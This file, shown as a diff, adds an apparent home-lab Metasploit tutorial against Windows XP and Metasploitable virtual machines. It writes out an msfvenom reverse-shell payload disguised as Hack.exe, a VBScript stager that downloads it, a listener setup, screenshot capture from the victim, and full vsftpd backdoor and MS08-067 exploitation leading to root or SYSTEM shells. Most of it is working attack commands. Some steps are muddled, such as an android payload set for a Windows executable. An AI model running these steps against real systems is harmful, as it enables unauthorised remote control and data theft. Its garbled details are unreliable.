@@ -1,0 +1,147 @@
+Step 1:
+• We will download Virtual box and install it.
+• Download and install Kali distribution.
+• Download and install Metasploitable which will be our hacking machine.
+• Download and install Windows XP which will be another hacking machine. 
+Step 2:
+• First of all, open the Metasploit console in Kali.
+• You can do so by following the path: Applications → Exploitation Tools → Metasploit.
+• Once you open the Metasploit console, you will get to see the following screen. Highlighted in red
+underline is the version of Metasploit.
+Step 3: use following command to install Metasploit-framework. After running this command, you will
+have to wait several minutes until the update completes.
+- Sudo apt install metasploit-framework
+- Sudo apt update
+- ifconfig
+Step 4: First we Create payload using command line in Kali Linux
+msf > msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.127.128 lport=4444 -f exe -a x86 >
+Hack.exe
+After successfully creating payload Hack.exe, copy that payload in to the victim’s PC (Windows).
+Step 5: Exploit using Command Prompt
+• Now we will use an exploit that can work for us. Open metasploit and set handler:
+Using following command
+- msfconsole
+Step 6: After that run this command to set Local host
+msf5>use exploit/multi/handler
+msf5 exploit(multi/handler)>set payload android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler)>>set lhost 192.168.43.159
+msf5 exploit(multi/handler)>>set lport 4444
+msf5 exploit(multi/handler)>>show options
+Step 7: After that run these command to set Remote host
+msf >use exploit/multi/handler
+msf > exploit(multi/handler)>set payload android/meterpreter/reverse_tcp
+msf > exploit(multi/handler)>>set rhost 192.168.127.128
+msf > exploit(multi/handler)>>set rport 80
+msf > exploit(multi/handler)>>show options
+Step 8 : Transfer or Share that Hack.exe from Kali Linux into Windows XP
+Step 9: After successful exploit.
+msf > exploit(multi/handler)>>show options
+msf > exploit(multi/handler)>>exploit
+Step 9: capture the session on remote host type the command screenshot its capture the victim Pc
+screenshot and save in root directory.
+-ls
+-sysinfo
+-screenshot
+-screenshare
+File store in root directory.
+Capture output
+
+
+To transfer
+
+Kali -> python3 -m http.server 80
+Windows XP ->
+strurl = "http://192.168.127.128/Hack.exe"
+strSaveTo = "C:\Hack.exe"
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.open "GET", strurl, false
+objXMLHTTP.send
+Set objADOStream = CreateObject("ADODB.Stream")
+objADOStream.Open
+objADOStream.Type = 1
+objADOStream.write objXMLHTTP.ResponseBody
+objADOStream.Position = 0
+objADOStream.SaveToFile strSaveTo, 2
+objADOStream.close
+
+
+
+Step 1: Initialization and Reconnaissance
+
+Open your Kali Linux terminal and launch the framework:
+
+Bash
+msfconsole
+Identify a vulnerability on your target. For this example, assume your Nmap scan revealed a vulnerable FTP service (e.g., vsftpd v2.3.4) on port 21.
+
+Search the framework's database for corresponding modules:
+
+Bash
+search type:exploit name:vsftpd
+Step 2: Module Configuration
+
+Instruct Metasploit to load the specific exploit module:
+
+Bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+View the required parameters for this exploit:
+
+Bash
+show options
+Set the target's IP address (Remote Host):
+
+Bash
+set RHOSTS 192.168.1.50
+Step 3: Payload Selection and Execution
+
+(Optional for some exploits, mandatory for others) Set the payload. This is the code that executes after the exploit succeeds.
+
+Bash
+set PAYLOAD cmd/unix/interact
+Launch the attack:
+
+Bash
+exploit
+The Result: If the target is vulnerable, the exploit will execute, and your terminal will drop into a remote command shell (root@metasploitable:~#), granting you complete operating system control over the target.
+
+
+
+Step 1: Reconnaissance (The Setup)
+
+Ensure both your Kali VM and Windows XP VM are on the same NAT/Host-only network.
+
+Scan the XP machine to confirm port 445 (SMB) is open:
+
+Bash
+nmap -sV -p 445 -O [Windows_XP_IP]
+Step 2: Configuring the Metasploit Framework
+
+Launch Metasploit:
+
+Bash
+msfconsole
+Search for the specific Microsoft Security Bulletin vulnerability:
+
+Bash
+search ms08_067
+Load the exploit module:
+
+Bash
+use exploit/windows/smb/ms08_067_netapi
+View and set the required parameters:
+
+Bash
+show options
+set RHOSTS [Windows_XP_IP]
+Step 3: Payload Delivery and Execution
+
+Set a reverse shell payload to establish a connection back to your Kali machine:
+
+Bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [Kali_Linux_IP]
+Launch the attack:
+
+Bash
+exploit
+The Result: Metasploit will trigger the buffer overflow, execute the payload, and open a meterpreter > prompt. You now have complete NT AUTHORITY\SYSTEM (the highest possible administrative privilege) access to the Windows XP machine.
